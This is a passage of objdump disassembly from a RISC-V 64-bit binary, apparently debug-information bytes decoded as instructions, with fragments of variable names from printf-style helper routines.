    185e:	a902                	fsd	ft0,144(sp)
    1860:	e301                	bnez	a4,1860 <_tbss_end+0x17dc>
    1862:	0005                	c.nop	1
    1864:	0200                	addi	s0,sp,256
    1866:	6891                	lui	a7,0x4
    1868:	2900                	fld	fs0,16(a0)
    186a:	063e                	slli	a2,a2,0xf
    186c:	0000                	unimp
    186e:	00aa250b          	0xaa250b
    1872:	0000                	unimp
    1874:	24a0                	fld	fs0,72(s1)
    1876:	8000                	0x8000
    1878:	0000                	unimp
    187a:	0000                	unimp
    187c:	003c                	addi	a5,sp,8
    187e:	0000                	unimp
    1880:	0000                	unimp
    1882:	0000                	unimp
    1884:	9c01                	subw	s0,s0,s0
    1886:	0ae8                	addi	a0,sp,348
    1888:	0000                	unimp
    188a:	7326                	ld	t1,104(sp)
    188c:	0200                	addi	s0,sp,256
    188e:	019f 05e3 0000      	0x5e3019f
    1894:	9102                	jalr	sp
    1896:	2758                	fld	fa4,136(a4)
    1898:	0070                	addi	a2,sp,12
    189a:	a102                	fsd	ft0,128(sp)
    189c:	e301                	bnez	a4,189c <_tbss_end+0x1818>
    189e:	0005                	c.nop	1
    18a0:	0200                	addi	s0,sp,256
    18a2:	6891                	lui	a7,0x4
    18a4:	2900                	fld	fs0,16(a0)
    18a6:	075f 0000 1d0b      	0x1d0b0000075f
    18ac:	0161                	addi	sp,sp,24
    18ae:	0000                	unimp
    18b0:	23d2                	fld	ft7,272(sp)
    18b2:	8000                	0x8000
    18b4:	0000                	unimp
    18b6:	0000                	unimp
    18b8:	00ce                	slli	ra,ra,0x13
    18ba:	0000                	unimp
    18bc:	0000                	unimp
    18be:	0000                	unimp
    18c0:	9c01                	subw	s0,s0,s0
    18c2:	0b89                	addi	s7,s7,2
    18c4:	0000                	unimp
    18c6:	b82a                	fsd	fa0,48(sp)
    18c8:	0008                	0x8
    18ca:	0200                	addi	s0,sp,256
    18cc:	018c                	addi	a1,sp,192
    18ce:	0161                	addi	sp,sp,24
    18d0:	0000                	unimp
    18d2:	9102                	jalr	sp
    18d4:	2a48                	fld	fa0,144(a2)
    18d6:	083e                	slli	a6,a6,0xf
    18d8:	0000                	unimp
    18da:	8c02                	jr	s8
    18dc:	4901                	li	s2,0
    18de:	0000                	unimp
    18e0:	0200                	addi	s0,sp,256
    18e2:	4491                	li	s1,4
    18e4:	6c26                	ld	s8,72(sp)
    18e6:	6e65                	lui	t3,0x19
    18e8:	0200                	addi	s0,sp,256
    18ea:	018c                	addi	a1,sp,192
    18ec:	00aa                	slli	ra,ra,0xa
    18ee:	0000                	unimp
    18f0:	7fb89103          	lh	sp,2043(a7) # 47fb <_tbss_end+0x4777>
    18f4:	0023f42b          	0x23f42b
    18f8:	0080                	addi	s0,sp,64
    18fa:	0000                	unimp
    18fc:	6c00                	ld	s0,24(s0)
    18fe:	0000                	unimp
    1900:	0000                	unimp
    1902:	0000                	unimp
    1904:	6900                	ld	s0,16(a0)
    1906:	2800000b          	0x2800000b
    190a:	0815                	addi	a6,a6,5
    190c:	0000                	unimp
    190e:	8f02                	jr	t5
    1910:	9a01                	andi	a2,a2,-32
    1912:	0000                	unimp
    1914:	0200                	addi	s0,sp,256
    1916:	5891                	li	a7,-28
    1918:	02006427          	0x2006427
    191c:	0194                	addi	a3,sp,192
    191e:	0b89                	addi	s7,s7,2
    1920:	0000                	unimp
    1922:	9102                	jalr	sp
    1924:	0068                	addi	a0,sp,12
    1926:	602c                	ld	a1,64(s0)
    1928:	0024                	addi	s1,sp,8
    192a:	0080                	addi	s0,sp,64
    192c:	0000                	unimp
    192e:	3400                	fld	fs0,40(s0)
    1930:	0000                	unimp
    1932:	0000                	unimp
    1934:	0000                	unimp
    1936:	2700                	fld	fs0,8(a4)
    1938:	0064                	addi	s1,sp,12
    193a:	9802                	jalr	a6
    193c:	6301                	0x6301
    193e:	0001                	nop
    1940:	0200                	addi	s0,sp,256
    1942:	6091                	lui	ra,0x4
    1944:	0000                	unimp
    1946:	009a080f          	0x9a080f
    194a:	0000                	unimp
    194c:	8a29                	andi	a2,a2,10
    194e:	0008                	0x8
    1950:	0b00                	addi	s0,sp,400
    1952:	0001611b          	0x1611b
    1956:	1a00                	addi	s0,sp,304
    1958:	00800023          	sb	s0,0(zero) # 0 <_tdata_begin>
    195c:	0000                	unimp
    195e:	b800                	fsd	fs0,48(s0)
    1960:	0000                	unimp
    1962:	0000                	unimp
    1964:	0000                	unimp
    1966:	0100                	addi	s0,sp,128
    1968:	3b9c                	fld	fa5,48(a5)
    196a:	000c                	0xc
    196c:	2a00                	fld	fs0,16(a2)
    196e:	08b8                	addi	a4,sp,88
    1970:	0000                	unimp
    1972:	7c02                	ld	s8,32(sp)
    1974:	6101                	0x6101
    1976:	0001                	nop
    1978:	0200                	addi	s0,sp,256
    197a:	4891                	li	a7,4
    197c:	7326                	ld	t1,104(sp)
    197e:	6372                	ld	t1,280(sp)
    1980:	0200                	addi	s0,sp,256
    1982:	017c                	addi	a5,sp,140
    1984:	00000c3b          	addw	s8,zero,zero
    1988:	9102                	jalr	sp
    198a:	2640                	fld	fs0,136(a2)
    198c:	656c                	ld	a1,200(a0)
    198e:	006e                	c.slli	zero,0x1b
    1990:	7c02                	ld	s8,32(sp)
    1992:	aa01                	j	1aa2 <_tbss_end+0x1a1e>
    1994:	0000                	unimp
    1996:	0300                	addi	s0,sp,384
    1998:	b891                	j	11ec <_tbss_end+0x1168>
    199a:	2b7f                	0x2b7f
    199c:	2340                	fld	fs0,128(a4)
    199e:	8000                	0x8000
    19a0:	0000                	unimp
    19a2:	0000                	unimp
    19a4:	0042                	c.slli	zero,0x10
    19a6:	0000                	unimp
    19a8:	0000                	unimp
    19aa:	0000                	unimp
    19ac:	0c0e                	slli	s8,s8,0x3
    19ae:	0000                	unimp
    19b0:	02007327          	0x2007327
    19b4:	017f                	0x17f
    19b6:	0c42                	slli	s8,s8,0x10
    19b8:	0000                	unimp
    19ba:	9102                	jalr	sp
    19bc:	2768                	fld	fa0,200(a4)
    19be:	0064                	addi	s1,sp,12
    19c0:	8002                	0x8002
    19c2:	8901                	andi	a0,a0,0
    19c4:	0200000b          	0x200000b
    19c8:	6091                	lui	ra,0x4
    19ca:	2c00                	fld	fs0,24(s0)
    19cc:	2382                	fld	ft7,0(sp)
    19ce:	8000                	0x8000
    19d0:	0000                	unimp
    19d2:	0000                	unimp
    19d4:	0044                	addi	s1,sp,4
    19d6:	0000                	unimp
    19d8:	0000                	unimp
    19da:	0000                	unimp
    19dc:	02007327          	0x2007327
    19e0:	0184                	addi	s1,sp,192
    19e2:	000005e3          	beqz	zero,21ec <_tbss_end+0x2168>
    19e6:	9102                	jalr	sp
    19e8:	2758                	fld	fa4,136(a4)
    19ea:	0064                	addi	s1,sp,12
    19ec:	8502                	jr	a0
    19ee:	6301                	0x6301
    19f0:	0001                	nop
    19f2:	0200                	addi	s0,sp,256
    19f4:	5091                	li	ra,-28
    19f6:	0000                	unimp
    19f8:	0c41080f          	0xc41080f
    19fc:	0000                	unimp
    19fe:	0f2d                	addi	t5,t5,11
    1a00:	a508                	fsd	fa0,8(a0)
    1a02:	0000                	unimp
    1a04:	2e00                	fld	fs0,24(a2)
    1a06:	07be                	slli	a5,a5,0xf
    1a08:	0000                	unimp
    1a0a:	0049f403          	0x49f403
    1a0e:	0000                	unimp
    1a10:	2266                	fld	ft4,88(sp)
    1a12:	8000                	0x8000
    1a14:	0000                	unimp
    1a16:	0000                	unimp
    1a18:	00b4                	addi	a3,sp,72
    1a1a:	0000                	unimp
    1a1c:	0000                	unimp
    1a1e:	0000                	unimp
    1a20:	9c01                	subw	s0,s0,s0
    1a22:	0cf9                	addi	s9,s9,30
    1a24:	0000                	unimp
    1a26:	7326                	ld	t1,104(sp)
    1a28:	7274                	ld	a3,224(a2)
    1a2a:	0200                	addi	s0,sp,256
    1a2c:	0168                	addi	a0,sp,140
    1a2e:	00000163          	beqz	zero,1a30 <_tbss_end+0x19ac>
    1a32:	7e889103          	lh	sp,2024(a7)
    1a36:	6626                	ld	a2,72(sp)
    1a38:	746d                	lui	s0,0xffffb
    1a3a:	0200                	addi	s0,sp,256
    1a3c:	0168                	addi	a0,sp,140
    1a3e:	000005e3          	beqz	zero,2248 <_tbss_end+0x21c4>
    1a42:	7e809103          	lh	sp,2024(ra) # 47e8 <_tbss_end+0x4764>
    1a46:	7061272f          	0x7061272f
    1a4a:	0200                	addi	s0,sp,256
    1a4c:	016a                	slli	sp,sp,0x1a
    1a4e:	0901                	addi	s2,s2,0
    1a50:	0000                	unimp
    1a52:	7fb09103          	lh	sp,2043(ra)
    1a56:	0b28                	addi	a0,sp,408
    1a58:	02000007          	0x2000007
    1a5c:	0163016b          	0x163016b
    1a60:	0000                	unimp
    1a62:	7fb89103          	lh	sp,2043(a7)
    1a66:	3030                	fld	fa2,96(s0)
    1a68:	0008                	0x8
    1a6a:	0200                	addi	s0,sp,256
    1a6c:	016e                	slli	sp,sp,0x1b
    1a6e:	2220                	fld	fs0,64(a2)
    1a70:	8000                	0x8000
    1a72:	0000                	unimp
    1a74:	0000                	unimp
    1a76:	0046                	c.slli	zero,0x11
    1a78:	0000                	unimp
    1a7a:	0000                	unimp
    1a7c:	0000                	unimp
    1a7e:	9c01                	subw	s0,s0,s0
    1a80:	06489107          	0x6489107
    1a84:	06019023          	sh	zero,96(gp) # 80003180 <__global_pointer$+0x60>
    1a88:	6326                	ld	t1,72(sp)
    1a8a:	0068                	addi	a0,sp,12
    1a8c:	6e02                	ld	t3,0(sp)
    1a8e:	4901                	li	s2,0
    1a90:	0000                	unimp
    1a92:	0200                	addi	s0,sp,256
    1a94:	5c91                	li	s9,-28
    1a96:	392a                	fld	fs2,168(sp)
    1a98:	0006                	c.slli	zero,0x1
    1a9a:	0200                	addi	s0,sp,256
    1a9c:	016e                	slli	sp,sp,0x1b
    1a9e:	0cf9                	addi	s9,s9,30
    1aa0:	0000                	unimp
    1aa2:	9102                	jalr	sp
    1aa4:	2850                	fld	fa2,144(s0)
    1aa6:	075a                	slli	a4,a4,0x16
    1aa8:	0000                	unimp
    1aaa:	7002                	0x7002
    1aac:	ff01                	bnez	a4,19c4 <_tbss_end+0x1940>
    1aae:	000c                	0xc
    1ab0:	0200                	addi	s0,sp,256
    1ab2:	6891                	lui	a7,0x4
    1ab4:	0000                	unimp
    1ab6:	0161080f          	0x161080f
    1aba:	0000                	unimp
    1abc:	0163080f          	0x163080f
    1ac0:	0000                	unimp
    1ac2:	452e                	lw	a0,200(sp)
    1ac4:	03000003          	lb	zero,48(zero) # 30 <_tdata_begin+0x30>
    1ac8:	49c8                	lw	a0,20(a1)
    1aca:	0000                	unimp
    1acc:	d200                	sw	s0,32(a2)
    1ace:	0021                	c.nop	8
    1ad0:	0080                	addi	s0,sp,64
    1ad2:	0000                	unimp
    1ad4:	4e00                	lw	s0,24(a2)
    1ad6:	0000                	unimp
    1ad8:	0000                	unimp
    1ada:	0000                	unimp
    1adc:	0100                	addi	s0,sp,128
    1ade:	479c                	lw	a5,8(a5)
    1ae0:	000d                	c.nop	3
    1ae2:	2600                	fld	fs0,8(a2)
    1ae4:	6d66                	ld	s10,88(sp)
    1ae6:	0074                	addi	a3,sp,12
    1ae8:	5d02                	lw	s10,32(sp)
    1aea:	e301                	bnez	a4,1aea <_tbss_end+0x1a66>
    1aec:	0005                	c.nop	1
    1aee:	0300                	addi	s0,sp,384
    1af0:	9891                	andi	s1,s1,-28
    1af2:	2f7f                	0x2f7f
    1af4:	00706127          	0x706127
    1af8:	5f02                	lw	t5,32(sp)
    1afa:	0101                	addi	sp,sp,0
    1afc:	0009                	c.nop	2
    1afe:	0300                	addi	s0,sp,384
    1b00:	a891                	j	1b54 <_tbss_end+0x1ad0>
    1b02:	007f                	0x7f
    1b04:	bd31                	j	1920 <_tbss_end+0x189c>
    1b06:	0008                	0x8
    1b08:	0200                	addi	s0,sp,256
    1b0a:	74c6                	ld	s1,112(sp)
    1b0c:	001e                	c.slli	zero,0x7
    1b0e:	0080                	addi	s0,sp,64
    1b10:	0000                	unimp
    1b12:	5e00                	lw	s0,56(a2)
    1b14:	00000003          	lb	zero,0(zero) # 0 <_tdata_begin>
    1b18:	0000                	unimp
    1b1a:	0100                	addi	s0,sp,128
    1b1c:	739c                	ld	a5,32(a5)
    1b1e:	000e                	c.slli	zero,0x3
    1b20:	3200                	fld	fs0,32(a2)
    1b22:	0838                	addi	a4,sp,24
    1b24:	0000                	unimp
    1b26:	c602                	sw	zero,12(sp)
    1b28:	00000e83          	lb	t4,0(zero) # 0 <_tdata_begin>
    1b2c:	7fa89103          	lh	sp,2042(a7) # 47fa <_tbss_end+0x4776>
    1b30:	a732                	fsd	fa2,392(sp)
    1b32:	02000007          	0x2000007
    1b36:	f9c6                	sd	a7,240(sp)
    1b38:	000c                	0xc
    1b3a:	0300                	addi	s0,sp,384
    1b3c:	a091                	j	1b80 <_tbss_end+0x1afc>
    1b3e:	337f                	0x337f
    1b40:	6d66                	ld	s10,88(sp)
    1b42:	0074                	addi	a3,sp,12
    1b44:	c602                	sw	zero,12(sp)
    1b46:	000005e3          	beqz	zero,2350 <_tbss_end+0x22cc>
    1b4a:	7f989103          	lh	sp,2041(a7)
    1b4e:	00706133          	or	sp,zero,t2
    1b52:	c602                	sw	zero,12(sp)
    1b54:	0901                	addi	s2,s2,0
    1b56:	0000                	unimp
    1b58:	7f909103          	lh	sp,2041(ra)
    1b5c:	7034                	ld	a3,96(s0)
    1b5e:	0200                	addi	s0,sp,256
    1b60:	e3c8                	sd	a0,128(a5)
    1b62:	0005                	c.nop	1
    1b64:	0100                	addi	s0,sp,128
    1b66:	2462                	fld	fs0,24(sp)
    1b68:	00000723          	sb	zero,14(zero) # e <_tdata_begin+0xe>
    1b6c:	c902                	sw	zero,144(sp)
    1b6e:	000005e3          	beqz	zero,2378 <_tbss_end+0x22f4>
    1b72:	7fb89103          	lh	sp,2043(a7)
    1b76:	6334                	ld	a3,64(a4)
    1b78:	0068                	addi	a0,sp,12
    1b7a:	ca02                	sw	zero,20(sp)
    1b7c:	0049                	c.nop	18
    1b7e:	0000                	unimp
    1b80:	5901                	li	s2,-32
    1b82:	6535                	lui	a0,0xd
    1b84:	7272                	ld	tp,312(sp)
    1b86:	0200                	addi	s0,sp,256
    1b88:	49ca                	lw	s3,144(sp)
    1b8a:	0000                	unimp
    1b8c:	3400                	fld	fs0,40(s0)
    1b8e:	756e                	ld	a0,248(sp)
    1b90:	006d                	c.nop	27
    1b92:	cb02                	sw	zero,148(sp)
    1b94:	07f0                	addi	a2,sp,972
    1b96:	0000                	unimp
    1b98:	9102                	jalr	sp
    1b9a:	2458                	fld	fa4,136(s0)
    1b9c:	000000f7          	0xf7
    1ba0:	cc02                	sw	zero,24(sp)
    1ba2:	0049                	c.nop	18
    1ba4:	0000                	unimp
    1ba6:	9102                	jalr	sp
    1ba8:	2454                	fld	fa3,136(s0)
    1baa:	0754                	addi	a3,sp,900
    1bac:	0000                	unimp
    1bae:	cc02                	sw	zero,24(sp)
    1bb0:	0049                	c.nop	18
    1bb2:	0000                	unimp
    1bb4:	9102                	jalr	sp
    1bb6:	2450                	fld	fa2,136(s0)
    1bb8:	0705                	addi	a4,a4,1
    1bba:	0000                	unimp
    1bbc:	cc02                	sw	zero,24(sp)
    1bbe:	0049                	c.nop	18
    1bc0:	0000                	unimp
    1bc2:	9102                	jalr	sp
    1bc4:	244c                	fld	fa1,136(s0)
    1bc6:	0666                	slli	a2,a2,0x19
    1bc8:	0000                	unimp
    1bca:	cc02                	sw	zero,24(sp)
    1bcc:	0049                	c.nop	18
    1bce:	0000                	unimp
    1bd0:	9102                	jalr	sp
    1bd2:	2448                	fld	fa0,136(s0)
    1bd4:	07e6                	slli	a5,a5,0x19
    1bd6:	0000                	unimp
    1bd8:	cc02                	sw	zero,24(sp)
    1bda:	0049                	c.nop	18
    1bdc:	0000                	unimp
    1bde:	7fb49103          	lh	sp,2043(s1) # 47fb <_tbss_end+0x4777>
    1be2:	f124                	sd	s1,96(a0)
    1be4:	0006                	c.slli	zero,0x1
    1be6:	0200                	addi	s0,sp,256
    1be8:	69cd                	lui	s3,0x13
    1bea:	0001                	nop
    1bec:	0200                	addi	s0,sp,256
    1bee:	4791                	li	a5,4
    1bf0:	3336                	fld	ft6,360(sp)
    1bf2:	02000007          	0x2000007
    1bf6:	f0df 001e 0080      	0x80001ef0df
    1bfc:	0000                	unimp
    1bfe:	3700                	fld	fs0,40(a4)
    1c00:	065e                	slli	a2,a2,0x17
    1c02:	0000                	unimp
    1c04:	0b02                	slli	s6,s6,0x0
    1c06:	ca01                	beqz	a2,1c16 <_tbss_end+0x1b92>
    1c08:	001f 0080 0000      	0x80001f
    1c0e:	3700                	fld	fs0,40(a4)
    1c10:	0799                	addi	a5,a5,6
    1c12:	0000                	unimp
    1c14:	4b02                	lw	s6,0(sp)
    1c16:	7c01                	lui	s8,0xfffe0
    1c18:	0021                	c.nop	8
    1c1a:	0080                	addi	s0,sp,64
    1c1c:	0000                	unimp
    1c1e:	3700                	fld	fs0,40(a4)
    1c20:	00000797          	auipc	a5,0x0
    1c24:	4902                	lw	s2,0(sp)
    1c26:	6801                	0x6801
    1c28:	0021                	c.nop	8
    1c2a:	0080                	addi	s0,sp,64
    1c2c:	0000                	unimp
    1c2e:	0000                	unimp
    1c30:	8320                	0x8320
    1c32:	000e                	c.slli	zero,0x3
    1c34:	1600                	addi	s0,sp,800
    1c36:	0049                	c.nop	18
    1c38:	0000                	unimp
    1c3a:	f916                	sd	t0,176(sp)
    1c3c:	000c                	0xc
    1c3e:	0000                	unimp
    1c40:	0e73080f          	0xe73080f
    1c44:	0000                	unimp
    1c46:	9038                	0x9038
    1c48:	02000007          	0x2000007
    1c4c:	b5bc                	fsd	fa5,104(a1)
    1c4e:	0000                	unimp
    1c50:	0c00                	addi	s0,sp,528
    1c52:	001e                	c.slli	zero,0x7
    1c54:	0080                	addi	s0,sp,64
    1c56:	0000                	unimp
    1c58:	6800                	ld	s0,16(s0)
    1c5a:	0000                	unimp
    1c5c:	0000                	unimp
    1c5e:	0000                	unimp
    1c60:	0100                	addi	s0,sp,128
    1c62:	c69c                	sw	a5,8(a3)
    1c64:	000e                	c.slli	zero,0x3
    1c66:	3300                	fld	fs0,32(a4)
    1c68:	7061                	c.lui	zero,0xffff8
    1c6a:	0200                	addi	s0,sp,256
    1c6c:	c6bc                	sw	a5,72(a3)
    1c6e:	000e                	c.slli	zero,0x3
    1c70:	0200                	addi	s0,sp,256
    1c72:	6891                	lui	a7,0x4
    1c74:	5432                	lw	s0,44(sp)
    1c76:	02000007          	0x2000007
    1c7a:	49bc                	lw	a5,80(a1)
    1c7c:	0000                	unimp
    1c7e:	0200                	addi	s0,sp,256
    1c80:	6491                	lui	s1,0x4
    1c82:	0f00                	addi	s0,sp,912
    1c84:	0108                	addi	a0,sp,128
    1c86:	0009                	c.nop	2
    1c88:	3800                	fld	fs0,48(s0)
    1c8a:	0686                	slli	a3,a3,0x1
    1c8c:	0000                	unimp
    1c8e:	b202                	fsd	ft0,288(sp)
    1c90:	07f0                	addi	a2,sp,972
    1c92:	0000                	unimp
    1c94:	1da0                	addi	s0,sp,760
    1c96:	8000                	0x8000
    1c98:	0000                	unimp
    1c9a:	0000                	unimp
    1c9c:	006c                	addi	a1,sp,12
    1c9e:	0000                	unimp
    1ca0:	0000                	unimp
    1ca2:	0000                	unimp
    1ca4:	9c01                	subw	s0,s0,s0
    1ca6:	0f09                	addi	t5,t5,2
    1ca8:	0000                	unimp
    1caa:	00706133          	or	sp,zero,t2
    1cae:	b202                	fsd	ft0,288(sp)
    1cb0:	0ec6                	slli	t4,t4,0x11
    1cb2:	0000                	unimp
    1cb4:	9102                	jalr	sp
    1cb6:	3268                	fld	fa0,224(a2)
    1cb8:	0754                	addi	a3,sp,900
    1cba:	0000                	unimp
    1cbc:	b202                	fsd	ft0,288(sp)
    1cbe:	0049                	c.nop	18
    1cc0:	0000                	unimp
    1cc2:	9102                	jalr	sp
    1cc4:	0064                	addi	s1,sp,12
    1cc6:	cc31                	beqz	s0,1d22 <_tbss_end+0x1c9e>
    1cc8:	0006                	c.slli	zero,0x1
    1cca:	0200                	addi	s0,sp,256
    1ccc:	a09d                	j	1d32 <_tbss_end+0x1cae>
    1cce:	001c                	0x1c
    1cd0:	0080                	addi	s0,sp,64
    1cd2:	0000                	unimp
    1cd4:	0000                	unimp
    1cd6:	0001                	nop
    1cd8:	0000                	unimp
    1cda:	0000                	unimp
    1cdc:	0100                	addi	s0,sp,128
    1cde:	9e9c                	0x9e9c
    1ce0:	3200000f          	0x3200000f
    1ce4:	0838                	addi	a4,sp,24
    1ce6:	0000                	unimp
    1ce8:	9d02                	jalr	s10
    1cea:	00000e83          	lb	t4,0(zero) # ffffffffffff8000 <_end+0xffffffff7ffdce00>
    1cee:	7dd89103          	lh	sp,2013(a7) # 47dd <_tbss_end+0x4759>
    1cf2:	a732                	fsd	fa2,392(sp)
    1cf4:	02000007          	0x2000007
    1cf8:	f99d                	bnez	a1,1c2e <_tbss_end+0x1baa>
    1cfa:	000c                	0xc
    1cfc:	0300                	addi	s0,sp,384
    1cfe:	d091                	beqz	s1,1c02 <_tbss_end+0x1b7e>
    1d00:	337d                	addiw	t1,t1,-1
    1d02:	756e                	ld	a0,248(sp)
    1d04:	006d                	c.nop	27
    1d06:	9e02                	jalr	t3
    1d08:	07f0                	addi	a2,sp,972
    1d0a:	0000                	unimp
    1d0c:	7dc89103          	lh	sp,2012(a7)
    1d10:	f732                	sd	a2,424(sp)
    1d12:	0000                	unimp
    1d14:	0200                	addi	s0,sp,256
    1d16:	5f9e                	lw	t6,228(sp)
    1d18:	0000                	unimp
    1d1a:	0300                	addi	s0,sp,384
    1d1c:	c491                	beqz	s1,1d28 <_tbss_end+0x1ca4>
    1d1e:	327d                	addiw	tp,tp,-1
    1d20:	0705                	addi	a4,a4,1
    1d22:	0000                	unimp
    1d24:	9e02                	jalr	t3
    1d26:	0049                	c.nop	18
    1d28:	0000                	unimp
    1d2a:	7dc09103          	lh	sp,2012(ra)
    1d2e:	f132                	sd	a2,160(sp)
    1d30:	0006                	c.slli	zero,0x1
    1d32:	0200                	addi	s0,sp,256
    1d34:	499e                	lw	s3,196(sp)
    1d36:	0000                	unimp
    1d38:	0300                	addi	s0,sp,384
    1d3a:	bc91                	j	178e <_tbss_end+0x170a>
    1d3c:	247d                	addiw	s0,s0,31
    1d3e:	0000082b          	0x82b
    1d42:	a002                	fsd	ft0,0(sp)
    1d44:	0f9e                	slli	t6,t6,0x7
    1d46:	0000                	unimp
    1d48:	7de89103          	lh	sp,2014(a7)
    1d4c:	7034                	ld	a3,96(s0)
    1d4e:	0200736f          	jal	t1,8d6e <_tbss_end+0x8cea>
    1d52:	49a1                	li	s3,8
    1d54:	0000                	unimp
    1d56:	0200                	addi	s0,sp,256
    1d58:	6c91                	lui	s9,0x4
    1d5a:	0a00                	addi	s0,sp,272
    1d5c:	005f 0000 0fae      	0xfae0000005f
    1d62:	0000                	unimp
    1d64:	0000780b          	0x780b
    1d68:	3f00                	fld	fs0,56(a4)
    1d6a:	3900                	fld	fs0,48(a0)
    1d6c:	00000843          	fmadd.s	fa6,ft0,ft0,ft0,rne
    1d70:	8f02                	jr	t5
    1d72:	1c12                	slli	s8,s8,0x24
    1d74:	8000                	0x8000
    1d76:	0000                	unimp
    1d78:	0000                	unimp
    1d7a:	008e                	slli	ra,ra,0x3
    1d7c:	0000                	unimp
    1d7e:	0000                	unimp
    1d80:	0000                	unimp
    1d82:	9c01                	subw	s0,s0,s0
    1d84:	0ff2                	slli	t6,t6,0x1c
    1d86:	0000                	unimp
    1d88:	02007833          	remu	a6,zero,zero
    1d8c:	00008a8f          	0x8a8f
    1d90:	0200                	addi	s0,sp,256
    1d92:	4891                	li	a7,4
    1d94:	7334                	ld	a3,96(a4)
    1d96:	7274                	ld	a3,224(a2)
    1d98:	0200                	addi	s0,sp,256
    1d9a:	f291                	bnez	a3,1c9e <_tbss_end+0x1c1a>
    1d9c:	0200000f          	fence	r,unknown
    1da0:	5891                	li	a7,-28
    1da2:	6934                	ld	a3,80(a0)
    1da4:	0200                	addi	s0,sp,256
    1da6:	4992                	lw	s3,4(sp)
    1da8:	0000                	unimp
    1daa:	0200                	addi	s0,sp,256
    1dac:	6c91                	lui	s9,0x4
    1dae:	0a00                	addi	s0,sp,272
    1db0:	0169                	addi	sp,sp,26
    1db2:	0000                	unimp
    1db4:	1002                	c.slli	zero,0x20
    1db6:	0000                	unimp
    1db8:	0000780b          	0x780b
    1dbc:	1000                	addi	s0,sp,32
    1dbe:	2e00                	fld	fs0,24(a2)
    1dc0:	068e                	slli	a3,a3,0x3
    1dc2:	0000                	unimp
    1dc4:	0049dc03          	lhu	s8,4(s3) # 13004 <_tbss_end+0x12f80>
    1dc8:	0000                	unimp
    1dca:	1ba0                	addi	s0,sp,504
    1dcc:	8000                	0x8000
    1dce:	0000                	unimp
    1dd0:	0000                	unimp
    1dd2:	0072                	c.slli	zero,0x1c
    1dd4:	0000                	unimp
    1dd6:	0000                	unimp
    1dd8:	0000                	unimp
    1dda:	9c01                	subw	s0,s0,s0
    1ddc:	1048                	addi	a0,sp,36
    1dde:	0000                	unimp
    1de0:	00686333          	or	t1,a6,t1
    1de4:	7f02                	ld	t5,32(sp)
    1de6:	0049                	c.nop	18
    1de8:	0000                	unimp
    1dea:	9102                	jalr	sp
    1dec:	3a6c                	fld	fa1,240(a2)
    1dee:	7562                	ld	a0,56(sp)
    1df0:	0066                	c.slli	zero,0x19
    1df2:	8102                	jr	sp
    1df4:	1048                	addi	a0,sp,36
    1df6:	0000                	unimp
    1df8:	3b40                	fld	fs0,176(a4)
    1dfa:	072c                	addi	a1,sp,904
    1dfc:	0000                	unimp
    1dfe:	8202                	jr	tp
    1e00:	0049                	c.nop	18
    1e02:	0000                	unimp
    1e04:	0a00                	addi	s0,sp,272
    1e06:	0169                	addi	sp,sp,26
    1e08:	0000                	unimp
    1e0a:	1058                	addi	a4,sp,36
    1e0c:	0000                	unimp
    1e0e:	0000780b          	0x780b
    1e12:	3f00                	fld	fs0,56(a4)
    1e14:	3900                	fld	fs0,48(a0)
    1e16:	0775                	addi	a4,a4,29
    1e18:	0000                	unimp
    1e1a:	6b02                	ld	s6,0(sp)
    1e1c:	1ac2                	slli	s5,s5,0x30
    1e1e:	8000                	0x8000
    1e20:	0000                	unimp
    1e22:	0000                	unimp
    1e24:	00de                	slli	ra,ra,0x17
    1e26:	0000                	unimp
    1e28:	0000                	unimp
    1e2a:	0000                	unimp
    1e2c:	9c01                	subw	s0,s0,s0
    1e2e:	10dc                	addi	a5,sp,100
    1e30:	0000                	unimp
    1e32:	64696333          	0x64696333
    1e36:	0200                	addi	s0,sp,256
    1e38:	0000496b          	0x496b
    1e3c:	0300                	addi	s0,sp,384
    1e3e:	cc91                	beqz	s1,1e5a <_tbss_end+0x1dd6>
    1e40:	337e                	fld	ft6,504(sp)
    1e42:	636e                	ld	t1,216(sp)
    1e44:	0200                	addi	s0,sp,256
    1e46:	0000496b          	0x496b
    1e4a:	0300                	addi	s0,sp,384
    1e4c:	c891                	beqz	s1,1e60 <_tbss_end+0x1ddc>
    1e4e:	347e                	fld	fs0,504(sp)
    1e50:	6572                	ld	a0,280(sp)
    1e52:	0074                	addi	a3,sp,12
    1e54:	7102                	ld	sp,32(sp)
    1e56:	0049                	c.nop	18
    1e58:	0000                	unimp
    1e5a:	9102                	jalr	sp
    1e5c:	3c50                	fld	fa2,184(s0)
    1e5e:	7562                	ld	a0,56(sp)
    1e60:	0066                	c.slli	zero,0x19
    1e62:	7302                	ld	t1,32(sp)
    1e64:	1048                	addi	a0,sp,36
    1e66:	0000                	unimp
    1e68:	0240                	addi	s0,sp,260
    1e6a:	0079                	c.nop	30
    1e6c:	5d24                	lw	s1,120(a0)
    1e6e:	0008                	0x8
    1e70:	0200                	addi	s0,sp,256
    1e72:	6374                	ld	a3,192(a4)
    1e74:	0001                	nop
    1e76:	0200                	addi	s0,sp,256
    1e78:	5891                	li	a7,-28
    1e7a:	122c                	addi	a1,sp,296
    1e7c:	0080001b          	addiw	zero,zero,8
    1e80:	0000                	unimp
    1e82:	7600                	ld	s0,40(a2)
    1e84:	0000                	unimp
    1e86:	0000                	unimp
    1e88:	0000                	unimp
    1e8a:	3400                	fld	fs0,40(s0)
    1e8c:	0069                	c.nop	26
    1e8e:	7502                	ld	a0,32(sp)
    1e90:	0049                	c.nop	18
    1e92:	0000                	unimp
    1e94:	9102                	jalr	sp
    1e96:	0054                	addi	a3,sp,4
    1e98:	3d00                	fld	fs0,56(a0)
    1e9a:	0862                	slli	a6,a6,0x18
    1e9c:	0000                	unimp
    1e9e:	6002                	0x6002
    1ea0:	1a68                	addi	a0,sp,316
    1ea2:	8000                	0x8000
    1ea4:	0000                	unimp
    1ea6:	0000                	unimp
    1ea8:	005a                	c.slli	zero,0x16
    1eaa:	0000                	unimp
    1eac:	0000                	unimp
    1eae:	0000                	unimp
    1eb0:	9c01                	subw	s0,s0,s0
    1eb2:	0000114f          	fnmadd.s	ft2,ft0,ft0,ft0,rtz
    1eb6:	f824                	sd	s1,112(s0)
    1eb8:	02000007          	0x2000007
    1ebc:	6162                	ld	sp,24(sp)
    1ebe:	0001                	nop
    1ec0:	0100                	addi	s0,sp,128
    1ec2:	2354                	fld	fa3,128(a4)
    1ec4:	0634                	addi	a3,sp,776
    1ec6:	0000                	unimp
    1ec8:	6302                	ld	t1,0(sp)
    1eca:	0169                	addi	sp,sp,26
    1ecc:	0000                	unimp
    1ece:	0007c623          	0x7c623
    1ed2:	0200                	addi	s0,sp,256
